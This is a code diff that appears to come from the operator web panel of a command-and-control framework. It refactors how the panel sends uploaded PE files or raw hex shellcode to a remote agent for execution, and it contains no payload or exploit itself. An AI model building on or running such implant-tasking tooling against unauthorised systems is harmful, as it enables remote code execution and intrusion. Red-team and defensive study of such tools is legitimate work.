@@ -340,82 +340,50 @@ document.addEventListener('DOMContentLoaded', function() {
     const agentId = "{{ agent.id }}";
     
     try {
-        let shellcodeBytes;
+        let formData = new FormData();
+        formData.append('agent_id', agentId);
+        formData.append('args', args);
+        formData.append('shellcodeType', shellcodeType);
         
         if (shellcodeType === 'file') {
-            // PE file handling (using Donut)
             const fileInput = document.getElementById('shellcodeFile');
             if (!fileInput.files.length) {
                 throw new Error('Please select a file');
             }
-            
-            const formData = new FormData();
             formData.append('file', fileInput.files[0]);
-            formData.append('args', args);
-            formData.append('agent_id', agentId);
-            
-            const response = await fetch('/api/shellcode', {
-                method: 'POST',
-                body: formData
-            });
-            
-            const data = await response.json();
-            
-            if (!response.ok) {
-                throw new Error(data.message || 'Failed to generate shellcode');
-            }
-            
-            alert(`Shellcode generated and sent to agent! Task ID: ${data.task_id}`);
-            window.location.reload();
         } else {
-            // Raw shellcode handling
             const method = document.querySelector('input[name="rawInputMethod"]:checked').value;
+            formData.append('rawInputMethod', method);
             
             if (method === 'file') {
                 const fileInput = document.getElementById('rawShellcodeFile');
                 if (!fileInput.files.length) {
                     throw new Error('Please select a shellcode file');
                 }
-                
-                shellcodeBytes = await readFileAsArrayBuffer(fileInput.files[0]);
+                formData.append('file', fileInput.files[0]);
             } else {
                 const hexString = document.getElementById('shellcodeHex').value.trim();
                 if (!hexString) {
                     throw new Error('Please enter hex shellcode');
                 }
-                
-                shellcodeBytes = new Uint8Array(hexString.match(/[0-9a-fA-F]{2}/g).map(h => parseInt(h, 16)));
+                formData.append('shellcodeHex', hexString);
             }
+        }
 
-            // Send as regular shellcode task but with raw flag
-            const response = await fetch('/api/task', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'Accept': 'application/json'
-                },
-                body: JSON.stringify({
-                    agent_id: agentId,
-                    task_type: 'shellcode',
-                    task_data: {
-                        shellcode: Array.from(shellcodeBytes),
-                        raw: true,
-                        method: 'direct'  // Indicates direct execution
-                    }
-                })
-            });
-            
-            const data = await response.json();
-            
-            if (!response.ok) {
-                throw new Error(data.message || 'Failed to send shellcode');
-            }
-            
-            alert(`Raw shellcode sent to agent! Task ID: ${data.task_id}`);
-            window.location.reload();
+        const response = await fetch('/api/shellcode', {
+            method: 'POST',
+            body: formData
+        });
+        
+        const data = await response.json();
+        
+        if (!response.ok) {
+            throw new Error(data.message || 'Failed to process shellcode');
         }
         
+        alert(`Shellcode task created successfully! Task ID: ${data.task_id}`);
         bootstrap.Modal.getInstance(document.getElementById('shellcodeModal')).hide();
+        window.location.reload();
     } catch (error) {
         console.error('Error:', error);
         alert(`Failed to process shellcode: ${error.message}`);
